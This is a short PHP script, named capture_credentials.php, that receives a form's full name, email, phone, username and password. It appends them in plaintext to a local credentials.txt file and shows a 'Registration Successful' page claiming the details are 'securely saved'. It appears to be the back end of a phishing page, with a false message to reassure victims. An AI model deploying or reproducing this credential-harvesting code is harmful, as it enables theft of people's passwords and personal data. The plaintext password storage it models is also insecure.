<?php
// capture_credentials.php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fullname = htmlspecialchars($_POST['fullname']);
    $email = htmlspecialchars($_POST['email']);
    $phone = htmlspecialchars($_POST['phone']);
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    $timestamp = date("Y-m-d H:i:s");

    $data = "[$timestamp] Full Name: $fullname | Email: $email | Phone: $phone | Username: $username | Password: $password\n";

    file_put_contents('credentials.txt', $data, FILE_APPEND | LOCK_EX);

    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Registration Successful</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f4;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .container {
                background: #fff;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
                text-align: center;
            }
            h1 {
                color: #4CAF50;
                margin-bottom: 20px;
            }
            p {
                color: #333;
            }
            button {
                margin-top: 20px;
                padding: 10px 20px;
                background-color: #4CAF50;
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                cursor: pointer;
            }
            button:hover {
                background-color: #45a049;
            }
        </style>
    </head>
    <body>

    <div class="container">
        <h1>Registration Successful!</h1>
        <p>Your details have been securely saved.</p>
        <button onclick="window.location.href=\'index.html\'">Go to Login</button>
    </div>

    </body>
    </html>
    ';
} else {
    echo "Invalid request.";
}
?>
